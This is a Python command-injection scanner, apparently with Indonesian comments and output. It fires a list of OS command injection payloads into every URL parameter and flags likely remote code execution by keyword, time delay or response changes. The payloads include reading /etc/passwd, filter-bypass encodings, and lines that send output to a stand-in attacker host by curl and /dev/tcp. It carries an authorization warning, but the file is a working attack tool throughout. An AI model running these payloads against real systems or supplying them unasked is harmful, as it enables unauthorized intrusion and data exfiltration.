#!/usr/bin/env python3
# RCE Scanner Pro - Advanced OS Command Injection Tester
# Gunakan HANYA pada target yang Anda miliki atau punya izin eksplisit!

import requests
import urllib.parse
import time
import sys
from colorama import init, Fore, Style
init(autoreset=True)

# Ethical Warning
print(Fore.RED + Style.BRIGHT + "[!] PERINGATAN: Tool ini hanya boleh digunakan untuk pengujian keamanan pada sistem yang ANDA MILIKI atau memiliki IZIN tertulis. Penyalahgunaan adalah ilegal!")

# Expanded & Advanced Payloads
PAYLOADS = [
    # Basic
    ";id",
    "&&id",
    "|id",
    ";whoami",
    "&&whoami",
    "|whoami",
    ";uname -a",
    ";cat /etc/passwd",
    ";ls -la",

    # Time-based blind
    ";sleep 5",
    "&&sleep 5",
    "|sleep 5",
    ";ping -c 5 127.0.0.1",
    "&&ping -n 5 127.0.0.1",  # Windows

    # Encoding bypass
    "$(id)",
    "`id`",
    "%0Aid",
    "%3Bid",
    ";%20id",
    ";${IFS}id",

    # Chaining & advanced
    ";echo vulnerable >/tmp/test&&cat /tmp/test",
    "|curl http://attacker.com/log",
    "||id",
    ";id>/dev/tcp/attacker.com/4444",

    # Windows specific
    "&whoami",
    "&systeminfo",
    "&ping -n 5 127.0.0.1",
]

CUSTOM_PAYLOADS = []

def load_custom_payloads(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        print(Fore.GREEN + f"[+] Loaded {len(lines)} custom payloads dari {file_path}")
        return lines
    except Exception as e:
        print(Fore.RED + f"[!] Gagal load custom payloads: {e}")
        return []

def get_baseline_response(url, session):
    """Ambil response normal sebagai baseline"""
    try:
        start = time.time()
        resp = session.get(url, timeout=10)
        duration = time.time() - start
        return resp.text.lower(), resp.status_code, duration, len(resp.text)
    except:
        return "", 0, 0, 0

def is_vulnerable(response_text, status_code, duration, length, baseline, payload):
    text = response_text.lower()

    # Keyword indicators (Linux/Unix)
    if any(kw in text for kw in ["uid=", "gid=", "groups=", "root:", "linux", "darwin", "ubuntu", "centos", "debian", "whoami"]):
        return "Keyword Match", Fore.RED

    # Keyword indicators (Windows)
    if any(kw in text for kw in ["administrator", "systeminfo", "windows nt", "microsoft"]):
        return "Windows Keyword", Fore.RED

    # Time delay detection (untuk sleep/ping)
    if "sleep" in payload or "ping" in payload:
        if duration > 4.5:  # Minimal 4.5 detik delay
            return "Time Delay (Blind)", Fore.MAGENTA

    # Timeout = possible blind RCE
    if duration == 0:  # Artinya timeout
        return "Timeout (Possible Blind)", Fore.MAGENTA

    # Significant length difference (bisa echo output)
    if baseline and abs(length - baseline[3]) > 50:
        return "Response Length Change", Fore.YELLOW

    # Error atau unexpected output
    if "command not found" in text or "not recognized" in text:
        return "Command Error Leak", Fore.YELLOW

    return None, None

def scan_rce(target_url, delay=1.0, custom_file=None):
    global CUSTOM_PAYLOADS
    if custom_file:
        CUSTOM_PAYLOADS = load_custom_payloads(custom_file)

    all_payloads = PAYLOADS + CUSTOM_PAYLOADS

    parsed = urllib.parse.urlparse(target_url)
    query_params = urllib.parse.parse_qs(parsed.query)

    if not query_params:
        print(Fore.YELLOW + "[!] Tidak ada parameter GET untuk diuji. Coba tambah manual seperti ?test=1")
        return

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (RCE-Scanner-Pro)"})

    print(Fore.CYAN + f"[+] Target: {target_url}")
    print(Fore.CYAN + f"[+] Parameter terdeteksi: {list(query_params.keys())}")
    print(Fore.CYAN + f"[+] Total payloads: {len(all_payloads)}")
    print(Fore.CYAN + f"[+] Delay antar request: {delay}s\n")

    # Baseline response
    baseline_text, baseline_code, baseline_time, baseline_len = get_baseline_response(target_url, session)
    print(Fore.BLUE + f"[i] Baseline: {baseline_code} | {baseline_time:.2f}s | {baseline_len} bytes\n")

    vulnerabilities_found = []

    for param in query_params:
        print(Fore.GREEN + Style.BRIGHT + f"[*] Menguji parameter: {param}")
        for payload in all_payloads:
            mod_query = query_params.copy()
            mod_query[param] = payload

            new_query = urllib.parse.urlencode(mod_query, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            print(f"{Fore.WHITE}[→] Payload: {payload}")

            start_time = time.time()
            try:
                response = session.get(test_url, timeout=12)
                duration = time.time() - start_time
                vuln_type, color = is_vulnerable(
                    response.text, response.status_code, duration, len(response.text),
                    (None, None, baseline_time, baseline_len), payload
                )

                if vuln_type:
                    msg = f"{color}[!!] {vuln_type} RCE → {test_url}"
                    print(msg)
                    vulnerabilities_found.append({
                        "param": param,
                        "payload": payload,
                        "url": test_url,
                        "type": vuln_type
                    })
                else:
                    print(Fore.WHITE + "    [-] Tidak vuln")

            except requests.exceptions.Timeout:
                print(Fore.MAGENTA + f"[!!] TIMEOUT → Kemungkinan Blind RCE: {test_url}")
                vulnerabilities_found.append({
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "type": "Timeout (Blind RCE)"
                })
            except Exception as e:
                print(Fore.RED + f"    [!] Error: {e}")

            time.sleep(delay)
        print("-" * 80)

    # Summary
    print(Fore.CYAN + Style.BRIGHT + "\n=== RINGKASAN SCAN ===")
    if vulnerabilities_found:
        print(Fore.RED + f"[!!] Ditemukan {len(vulnerabilities_found)} kemungkinan RCE!")
        for v in vulnerabilities_found:
            print(f"   • Param: {v['param']} | Payload: {v['payload']} | Type: {v['type']}")
    else:
        print(Fore.GREEN + "[+] Tidak ditemukan indikasi RCE yang jelas.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 rce_scanner_pro.py \"https://target.com/?id=1\" [--delay 1.5] [--payloads custom.txt]")
        sys.exit(1)

    target = sys.argv[1]
    delay = 1.0
    custom_payload = None

    if "--delay" in sys.argv:
        try:
            delay = float(sys.argv[sys.argv.index("--delay") + 1])
        except:
            print("[!] Delay harus angka. Pakai default 1.0")
    
    if "--payloads" in sys.argv:
        try:
            custom_payload = sys.argv[sys.argv.index("--payloads") + 1]
        except:
            print("[!] File payloads tidak ditemukan.")

    scan_rce(target, delay=delay, custom_file=custom_payload)
